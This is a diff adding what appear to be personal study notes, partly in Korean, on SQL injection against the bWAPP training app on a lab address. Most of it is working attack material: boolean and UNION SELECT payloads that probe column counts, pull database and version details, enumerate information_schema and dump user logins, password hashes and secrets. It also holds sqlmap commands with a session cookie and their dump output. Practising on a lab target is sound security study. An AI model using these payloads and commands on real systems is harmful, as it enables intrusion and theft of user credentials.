@@ -1,0 +1,177 @@
+create table ccna (userid varchar(20), userpass varchar(20), username varchar(20), age int);
+create table ccnp (userid varchar(20), userpass varchar(20), username varchar(20), age int);
+
+ccna
+
+userid	userpass	username	   age
+
+insert into ccna (userid, userpass, username, age) values('ccna1', 'ccna1111', 'kim jung woo', '24');
+insert into ccna (userid, userpass, username, age) values('ccna2', 'ccna2222', 'kim jung soo', '27');
+insert into ccna (userid, userpass, username, age) values('ccna3', 'ccna3333', 'kim jung ah', '29');
+
+select * from ccna;
+
+insert into ccnp (userid, userpass, username, age) values('ccnp1', 'ccnp1111', 'kim jung woo', '34');
+insert into ccnp (userid, userpass, username, age) values('ccnp2', 'ccnp2222', 'kim jung soo', '37');
+insert into ccnp (userid, userpass, username, age) values('ccnp3', 'ccnp3333', 'kim jung ah', '39');
+
+select * from ccnp;
+select * userid, userpass from ccnp;
+
+1' or 1=1 #
+
+select * from movies;
+
+$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
+
+
+$sql = "SELECT * FROM movies WHERE title LIKE '%1' or 1=1 #%'";
+
+
+참 and 참  = 참
+참 and 거짓 = 거짓
+거짓 and 거짓 = 거짓
+
+참 or 참 = 참
+참 or 거짓 = 참				'%iron%'
+거짓 or 거짓 = 거짓
+
+
+' union select all 1#
+' union select all 1,2#
+' union select all 1,2,3#
+' union select all 1,2,3,4#
+' union select all 1,2,3,4,5#
+' union select all 1,2,3,4,5,6#
+' union select all 1,2,3,4,5,6,7#
+
+2 3 5 4
+
+' union select all 1,database(), user(), system_user(), @@version,6,7 #
+
+ - database() : 데이터베이스 이름
+ - user() : 사용자 아이디
+ - system_user() : 관리자 권한 아이디
+ - @@version : SQL 버전
+ - table_name : 테이블 이름
+ - culumn_name: 컬럼 이름
+ - concat() : 컬럼 문자를 합치는 기능
+
+2 3 5 4
+
+0' union select all 1,database(), user(), system_user(), @@version,6,7 #
+
+$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
+
+$sql = "SELECT * FROM movies WHERE title LIKE '%0' union select all 1,database(), user(), system_user(), @@version,6,7 #%'";
+
+0' union select all 1,database(), user(), system_user(), @@version,6,7 #
+
+
+2 3 5 4
+
+0' union select all 1,table_name,3,4,5,6,7 from information_schema.tables #
+
+
+mysql> use information_schema;
+mysql> show tables;
+mysql> select column_name from columns where table_name='users';
+
+
+0' union select all 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' #
+
+2 3 5 4
+
+0' union select all 1,2,3,4,5,6,7#
+
+mysql> select login,password,email,secret from users;
+
+0' union select all 1,login,password,email,secret,6,7 from users #
+
+mysql> select id,login,password,email,secret from users;
+
+
+0' union select all 1,concat(id,login),password,email,secret,6,7 from users #
+
+
+0' union select all 1,concat(id,login),password,email,secret,6,7 from users #
+
+title=0' union select all 1,concat(id,login),password,email,secret,6,7 from users #&action=search
+
+
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=3'&action=go
+
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,2,3,4,5,6,7#&action=go
+
+2 3 5 4
+
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,database(), user(), system_user(), @@version,6,7 #&action=go
+
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,concat(id,login),password,email,secret,6,7 from users #&action=search&action=go
+
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,concat(id,login),password,email,secret,6,7 from users limit 1,1#&action=search&action=go
+
+0, 1 <- AIM
+1, 1 <- bee
+
+
+movie=2&action=go
+
+movie=0 union select all 1,concat(id,login),password,email,secret,6,7 from users limit 1,1#&action=go
+
+
+Cookie: security_level=0; PHPSESSID=8f5c1a54413493a0cdfb4f6274f2ab8f
+
+http://192.168.20.205/bWAPP/sqli_13.php
+
+movie=1&action=go
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" --cookie="security_level=0; PHPSESSID=8f5c1a54413493a0cdfb4f6274f2ab8f" --data "movie=1&action=go" --dbs
+
+available databases [5]:
+[*] bWAPP
+[*] cisco
+[*] drupageddon
+[*] information_schema
+[*] mysql
+
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" --cookie="security_level=0; PHPSESSID=8f5c1a54413493a0cdfb4f6274f2ab8f" --data "movie=1&action=go" -p "movie" --tables
+
+
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" --cookie="security_level=0; PHPSESSID=8f5c1a54413493a0cdfb4f6274f2ab8f" --data "movie=1&action=go" -p "movie" -D "bWAPP" --tables
+
+Database: bWAPP
+[5 tables]
++----------+
+| blog     |
+| heroes   |
+| movies   |
+| users    |
+| visitors |
++----------+
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" --cookie="security_level=0; PHPSESSID=8f5c1a54413493a0cdfb4f6274f2ab8f" --data "movie=1&action=go" -p "movie" -D "bWAPP" -T "users" --dump
+
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_13.php" --cookie="security_level=0; PHPSESSID=8f5c1a54413493a0cdfb4f6274f2ab8f" --data "movie=1&action=go" -p "movie" -D "bWAPP" -T "users" -C login,password,secret  --dump
+
+root@kali:~# cat /root/.sqlmap/output/192.168.20.205/dump/bWAPP/users.csv
+login,password,secret
+A.I.M.,6885858486f31043e5839c735d99457f045affd0 (bug),A.I.M. or Authentication Is Missing
+bee,6885858486f31043e5839c735d99457f045affd0 (bug),Any bugs?
+
+
+
+
+0' union select all 1,2,3,4,5,6,7#
+
+0' union select all 1,database(), user(), system_user(), @@version,6,7 #
+
+0' union select all 1,concat(id,login),password,email,secret,6,7 from users #
